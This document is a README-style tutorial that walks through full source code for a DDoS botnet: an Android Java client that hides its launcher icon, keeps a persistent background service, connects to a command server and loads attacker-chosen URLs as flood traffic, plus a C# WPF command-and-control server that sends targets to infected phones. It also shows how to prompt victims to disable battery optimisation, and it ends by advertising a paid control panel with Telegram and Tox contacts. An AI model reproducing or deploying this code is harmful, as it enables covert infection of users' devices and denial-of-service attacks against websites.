### <p align="center">DDoS Android Botnet + Android Client / Windows Server - Code</center>

![230750](https://github.com/user-attachments/assets/d6df1dbc-3bba-4afd-b0f4-0e6acab0436d)

> [!NOTE]
> DDoS Botnet is a network of infected devices controlled by an attacker to carry out distributed denial of Service attacks (DDoS — Distributed Denial of Service).
In such a network, every infected computer (or any other device, for example, an Android smartphone, as in our case) becomes part of a botnet and receives commands from the server, receiving the addresses of targets for attack.

We will not do some ordinary HTTP Flood that works through requests, but a full-fledged download of a web resource, in our case through WebView. I will also add another DDoS method solely for example — for example, I will take ping, it is the easiest to implement, but it also borders on useless. In any case, it doesn't matter, as it will be added as a practical example. Later, replacing it with other methods will not be a problem for you if you use the code from the article.

- To write the backend, I will use C# (.NET 4.8) and WPF markup (Windows Presentation Foundation).
- To write the client part, I will use Java (A) and Groovy DSL (build.gradle) with a minimum API of 28 (A9).

I'll start with the Android client code in Java.

First, we need to define permissions in AndroidManifest.xml:

```
<uses-permission android:name="android.permission.INTERNET" />
 <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 <uses-permission android:name="android.permission.WAKE_LOCK" />
 <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
```

Also, if you want the icon of your application not to be visible, add to the Activity inside AndroidManifest.xml the following:

```
<category android:name="android.intent.category.LEANBACK_LAUNCHER" />
```
Since in MainActivity.if we have nothing but running our FOREGROUND_SERVICE, then its code will look like this:

```
package com.nmz.DDoSBTest;

import android.content.Intent;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
       
        Intent serviceIntent = new Intent(MainActivity.this, BackgroundWVService.class); //Запуск нашего сервиса до которого мы еще дойдем
        startService(serviceIntent);
    }
}
```

Nothing happens except the launch of the service, but I would like to go to it not immediately, but to tell you a little about how our page will load via WebView. There is a WebViewService in the code for this.java, which has the task of loading a page and displays information about it briefly in ADB.

The WebViewService code.java:

```
private WebView webView;

    @Override
    public void onCreate() {
        super.onCreate();
        webView = new WebView(this);
        webView.setWebViewClient(new CustomWebViewClient());
        webView.getSettings().setJavaScriptEnabled(true);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String url = intent.getStringExtra("url");

        if (url != null) {

            if (!isValidUrl(url)) {
                url = "http://" + url;
            }

            Log.d(TAG, "Loading URL/IP in WebView: " + url);
            webView.loadUrl(url);
        } else {
            Log.e(TAG, "No URL/IP received");
        }

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        if (webView != null) {
            webView.destroy();
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private boolean isValidUrl(String url) {
        return url.startsWith("http://") || url.startsWith("https://");
    }

    private class CustomWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            Log.d(TAG, "Page loading: " + url);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            Log.d(TAG, "Page finished loading: " + url);

            String title = view.getTitle();
            Log.d(TAG, "Page title: " + title);
        }

        @Override
        public void onReceivedHttpError(WebView view, WebResourceRequest request, android.webkit.WebResourceResponse errorResponse) {
            super.onReceivedHttpError(view, request, errorResponse);
            Log.e(TAG, "HTTP error for URL/IP: " + request.getUrl() + " Error code: " + errorResponse.getStatusCode());
        }

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            super.onReceivedError(view, errorCode, description, failingUrl);
            Log.e(TAG, "Error loading URL/IP: " + failingUrl + " Error code: " + errorCode + " Description: " + description);
        }
    }
}
```
The code loads a web page into a WebView and displays brief content about it.


Now I would like to mention the AttackerReceiverURLIP code.java, which receives the IP or URL of the site, then checks it for validity, and if it receives an IP without an HTTP/HTPPS header, then adds it and sends it further to WebViewService.java .

The code AttackerReceiverURLIP.java:

```
public class AttackerReceiverURLIP extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String url = intent.getStringExtra("url");
        Log.d("UrlReceiver", "Received URL: " + url);
        if (url != null) {
            // Checking and adding a prefix, for example, if an ip is transmitted, well, a check
            if (!url.startsWith("http://") && !url.startsWith("https://")) {
                url = "https://" + url;
            }

            if (isValidUrl(url)) {
                Intent serviceIntent = new Intent(context, WebViewService.class);
                serviceIntent.putExtra("url", url);
                context.startService(serviceIntent);
            } else {
                Log.e("UrlReceiver", "Invalid URL received: " + url);
            }
        }
    }

    private boolean isValidUrl(String url) {
        return url != null && (url.startsWith("http://") || url.startsWith("https://"));
    }
}
```
Now it's worth switching to the latest client—side service - this is BackgroundWVService.java, and here, accordingly, is its code:

```
private static final String CHANNEL_ID = "DDoSChannel";
private Handler ReconnectServerHandler = new Handler(Looper.getMainLooper());
private boolean isConnected = false;
private Socket clientSocket;
private BufferedReader input;
private OutputStream output;


 @Override
    public void onCreate() { //initializations in onCreate
        super.onCreate();

 createNotificationChannel();
 startForegroundService();
 connectToServer();

}


    private void createNotificationChannel() { //13,14D They demand such perversions.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Foreground Service";
            String description = "Channel";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Foreground Service")
                .setContentText("Service is running in the background")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(1, notification);
    }
@Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void connectToServer() {
        new ConnectToServerTask().execute("127.0.0.1", "6666");//ip:p servers
    }

    private class ConnectToServerTask extends AsyncTask<String, Void, Boolean> {
        private String serverIp;
        private int serverPort;

        @Override
        protected Boolean doInBackground(String... params) {
            serverIp = params[0];
            serverPort = Integer.parseInt(params[1]);

            while (!isConnected) {
                try {
                    clientSocket = new Socket(serverIp, serverPort);
                    input = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                    output = clientSocket.getOutputStream();
                    isConnected = true;

                    new ReceiveMessagesTask().start();
 } catch (Exception e) {
                    Log.e("ConnectToServerTask", "Error connecting to server, retrying in 5 seconds", e);
                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException ie) {
                        Log.e("ConnectToServerTask", "Interrupted during reconnection delay", ie);
                    }
                }
            }
            return false;
        }


@Override
        protected void onPostExecute(Boolean result) {
            if (result) {
                Toast.makeText(getApplicationContext(), "Connected to the server", Toast.LENGTH_SHORT).show();
            } else {
                startReconnection();
            }
        }
    }

    private void startReconnection() {
        ReconnectServerHandler.postDelayed(() -> {
            if (!isConnected) {
                Log.d("Reconnection", "Attempting to reconnect...");
                connectToServer();
            }
        }, 5000);
    }

    private class SendMessageTask extends AsyncTask<String, Void, Void> {
        private static final int CHUNK_SIZE = 1024;
        private static final long DELAY_MS = 500;

        @Override
        protected Void doInBackground(String... messages) {
            try {
                if (isConnected && output != null) {
                    for (String message : messages) {

                        byte[] messageBytes = message.getBytes();
                        int length = messageBytes.length;
                        for (int i = 0; i < length; i += CHUNK_SIZE) {
                            int end = Math.min(length, i + CHUNK_SIZE);
                            output.write(messageBytes, i, end - i);
                            output.flush();
                            Thread.sleep(DELAY_MS);
                        }
                    }
                }
            } catch (Exception e) {
                Log.e("SendMessageTask", "Error sending message", e);
            }
            return null;
        }
    }

    private class ReceiveMessagesTask extends Thread {
        private final Handler uiHandler = new Handler(Looper.getMainLooper());

        @Override
        public void run() {
            try {
                while (isConnected) {
                    String message = input.readLine();
                    if (message != null) {
                        if (isValidUrl(message)) {
                            handleUrl(message);
                        } else {
                            uiHandler.post(() -> Toast.makeText(getApplicationContext(), "msg s: " + message, Toast.LENGTH_LONG).show());
                        }
                    }
                }
            } catch (Exception e) {
                Log.e("ReceiveMessagesTask", "Connection lost, attempting to reconnect", e);
                isConnected = false;
                startReconnection();
            }
        }
    }
private void handleUrl(String url) {
        //Adding http so that if, for example, a person transmits an ip, then we click on it as well as on the link
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            url = "https://" + url;
        }

        Intent intent = new Intent(BackgroundWVService.this, WebViewService.class);
        intent.putExtra("url", url);
        startService(intent);
    }

    private boolean isValidUrl(String url) {
        try {
            Uri uri = Uri.parse(url);
            return uri.getScheme() != null && (uri.getScheme().equals("http") || uri.getScheme().equals("https"));
        } catch (Exception e) {
            return false;
        }
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            isConnected = false;
            if (clientSocket != null) {
                clientSocket.close();
            }
        } catch (Exception e) {
            Log.e("onDestroy", "Error closing socket", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
```
This completes the client's code. I did not describe some of the already clear points, such as the entire Manifest code or sending specific data to the server, such as the Android version or device model, although you can easily get them and optionally send them to the server.

```
AndroidVersion = "Android Version: " + Build.VERSION.RELEASE;
SDeviceModel = "Device Model: " + Build.MODEL;
```

Now that everything is more or less clear with the client's code and what is happening on his side, you can start with the server code. There will be no builder or any bells and whistles on the server side - only the functionality of sending data to the server and accepting responses from the client.

#### DDoServer Code:

```
public partial class MainWindow : Window
    {
        private ObservableCollection<ClientInfo> _clients;
        private TcpListener _server;
        private Thread _serverThread;
        private Thread _monitorThread;
        private int _serverPort = 4444; //standard listening port
        private Dictionary<string, string> _clientMessages;
        private volatile bool _isServerRunning;
        private ConcurrentDictionary<string, TcpClient> _connectedClients;

        public MainWindow()
        {
            InitializeComponent();
            _clients = new ObservableCollection<ClientInfo>(); //Initializations
            clientsview.ItemsSource = _clients;
            _clientMessages = new Dictionary<string, string>();
            _connectedClients = new ConcurrentDictionary<string, TcpClient>();
        }
```
The Start Server Handler:

```
if (_serverThread != null && _serverThread.IsAlive)
            {
                MessageBox.Show("Server is already running.");
                return;
            }

            if (!int.TryParse(portTextBox.Text, out _serverPort))
            {
                MessageBox.Show("Invalid port number. Please enter a valid number.");
                return;
            }

            _serverThread = new Thread(StartServer);
            _serverThread.IsBackground = true;
            _serverThread.Start();

            _monitorThread = new Thread(MonitorClients);
            _monitorThread.IsBackground = true;
            _monitorThread.Start();
        }
```

#### Methods / the rest:

```
private void StartServer()
{
    try
    {
        _server = new TcpListener(IPAddress.Any, _serverPort);
        _server.Start();
        _isServerRunning = true;
        Dispatcher.Invoke(() => MessageBox.Show($"Server started on port {_serverPort}"));

        while (_isServerRunning)
        {
            if (_server.Pending())
            {
                TcpClient client = _server.AcceptTcpClient();
                IPEndPoint clientEndPoint = client.Client.RemoteEndPoint as IPEndPoint;

                if (clientEndPoint != null)
                {
                    string clientIp = clientEndPoint.Address.ToString();

                    
                    if (_connectedClients.ContainsKey(clientIp))
                    {
                      
                        if (_connectedClients.TryRemove(clientIp, out TcpClient oldClient))
                        {
                            oldClient.Close();
                        }
                    }

                    if (_connectedClients.TryAdd(clientIp, client))
                    {
                        Dispatcher.Invoke(() =>
                        {
                            var existingClient = _clients.FirstOrDefault(c => c.IPAddress == clientIp);
                            if (existingClient == null)
                            {
                                _clients.Add(new ClientInfo
                                {
                                    IPAddress = clientIp,
                                    TcpClient = client
                                });
                            }
                            else
                            {
                            
                                existingClient.TcpClient = client;
                            }
                            MessageBox.Show($"New client connected: {clientIp}");
                        });
                    }

                
                    Thread clientThread = new Thread(() => HandleClient(client, clientIp));
                    clientThread.IsBackground = true;
                    clientThread.Start();
                }
            }
            else
            {
                Thread.Sleep(100);
            }
        }
    }
    catch (SocketException ex)
    {
        if (ex.SocketErrorCode != SocketError.Interrupted)
        {
            Dispatcher.Invoke(() => MessageBox.Show($"Error: {ex.Message}"));
        }
    }
    catch (Exception ex)
    {
        Dispatcher.Invoke(() => MessageBox.Show($"Error: {ex.Message}"));
    }
}


 private void HandleClient(TcpClient client, string clientIp)
 {
     try
     {
         NetworkStream stream = client.GetStream();
         byte[] buffer = new byte[1024];
         int bytesRead;

         while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
         {
             string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);

          
             lock (_clientMessages)
             {
                 _clientMessages[clientIp] = message;
             }

            
             SaveMessageToFile(clientIp, message);

            
             var lines = message.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);

            
             Dispatcher.Invoke(() =>
             {
                 foreach (var line in lines)
                 {
                     if (clientsview.SelectedItem is ClientInfo selectedClient && selectedClient.IPAddress == clientIp)
                     {
                         packetText.Text += line + Environment.NewLine;
                     }
                 }
             });
         }
     }
     catch (Exception ex)
     {
         Console.WriteLine($"Client error: {ex.Message}");
     }
     finally
     {
      
         Dispatcher.Invoke(() =>
         {
             try
             {
                 lock (_clients)
                 {
              
                     var clientInfo = _clients.FirstOrDefault(c => c.IPAddress == clientIp);
                     if (clientInfo != null)
                     {
                         _clients.Remove(clientInfo);
                     }
                 }

            
                 lock (_clientMessages)
                 {
                     if (_clientMessages.ContainsKey(clientIp))
                     {
                         _clientMessages.Remove(clientIp);
                     }
                 }

              
                 if (clientsview.SelectedItem is ClientInfo selectedClient && selectedClient.IPAddress == clientIp)
                 {
                     packetText.Text = string.Empty;
                 }
             }
             catch (Exception uiEx)
             {
                 Console.WriteLine($"UI error: {uiEx.Message}");
             }
         });

      
         try
         {
             client.Close();
         }
         catch (Exception ex)
         {
             Console.WriteLine($"Error closing client connection: {ex.Message}");
         }
     }
 }


 private void MonitorClients()
 {
     while (_isServerRunning)
     {
         foreach (var kvp in _connectedClients.ToList())
         {
             string clientIp = kvp.Key;
             TcpClient client = kvp.Value;

             try
             {
                
                 if (client.Client.Poll(0, SelectMode.SelectRead))
                 {
                     byte[] check = new byte[1];
                     if (client.Client.Receive(check, SocketFlags.Peek) == 0)
                     {
                  
                         Dispatcher.Invoke(() =>
                         {
                        
                             var clientInfo = _clients.FirstOrDefault(c => c.IPAddress == clientIp);
                             if (clientInfo != null)
                             {
                                 _clients.Remove(clientInfo);
                             }

                          
                             lock (_clientMessages)
                             {
                                 if (_clientMessages.ContainsKey(clientIp))
                                 {
                                     _clientMessages.Remove(clientIp);
                                 }
                             }

                             if (clientsview.SelectedItem is ClientInfo selectedClient && selectedClient.IPAddress == clientIp)
                             {
                                 packetText.Text = string.Empty;
                             }
                         });

                         _connectedClients.TryRemove(clientIp, out _);
                         client.Close();
                     }
                 }
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"Error monitoring client {clientIp}: {ex.Message}");
             }
         }

         Thread.Sleep(5000);
     }
 }

 private void StopServer()
 {
     try
     {
         _isServerRunning = false;

         _server?.Stop();

         foreach (var clientInfo in _clients.ToList())
         {
             if (clientInfo.TcpClient != null && clientInfo.TcpClient.Connected)
             {
                 clientInfo.TcpClient.Close();
             }
         }

         _serverThread?.Join();
         _monitorThread?.Join();
         Dispatcher.Invoke(() => MessageBox.Show("Server stopped successfully."));
     }
     catch (Exception ex)
     {
         Dispatcher.Invoke(() => MessageBox.Show($"Error stopping server: {ex.Message}"));
     }
 }
```
#### The code for sending information to the client:

```
 string link = DDoSTx.Text;

 if (!string.IsNullOrWhiteSpace(link))
 {
     SendMessageToAllClients(link);
 }
 else
 {
     MessageBox.Show("Write Link.");
 }

---

 foreach (var clientInfo in _clients.ToList())
 {
     if (clientInfo.TcpClient != null && clientInfo.TcpClient.Connected)
     {
         try
         {
             NetworkStream stream = clientInfo.TcpClient.GetStream();
             byte[] buffer = Encoding.UTF8.GetBytes(message + "\n");
             stream.Write(buffer, 0, buffer.Length);
             stream.Flush();
```

#### The code that sends the task to one selected client from the IP list:

```
  if (clientsview.SelectedItem is ClientInfo selectedClient)
            {
                string clientIp = selectedClient.IPAddress;

                if (_clientMessages.ContainsKey(clientIp))
                {
                    string link = DDoSTx.Text;

                    if (!string.IsNullOrWhiteSpace(link))
                    {
                        SendLinkToClient(clientIp, link);
                    }
                    else
                    {
                        MessageBox.Show("Write Link/Ip.");
                    }
                }
                else
                {
                    MessageBox.Show("Client not found.");
                }
            }
            else
            {
                MessageBox.Show("Select a client from the list of IP.");
            }
        }
```

#### The method for this is:

```
  private void clientsview_SelectionChanged(object sender, SelectionChangedEventArgs e)
  {
      if (clientsview.SelectedItem is ClientInfo selectedClient)
      {
          if (_clientMessages.ContainsKey(selectedClient.IPAddress))
          {
              packetText.Text = _clientMessages[selectedClient.IPAddress];
          }
      }
  }
```

> [!TIP]
> In new versions of Android, the rules for the operation of background services have been tightened,
and the activity monitoring system (BATTERY_OPTIMIZATIONS) can forcibly terminate our process.

#### To prevent this, you can add the following code to MainActivity.java:

```
 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                showDisableBatteryOptimizationDialog();
            }
        }
    }

    private void showDisableBatteryOptimizationDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Disabling activity monitoring")
            .setMessage("For the correct operation of the application, disable activity monitoring in the battery settings.")
            .setPositiveButton("Go to Settings", (dialog, which) -> {
                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                startActivity(intent);
            })
            .setNegativeButton("Cancel", null)
            .show();
    }
```

#### You also need to add the uses-permission to the file AndroidManifest.xml:

```
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
```

#### The GUI of the server panel can be purchased separately by contacting us first.

<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">
Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72
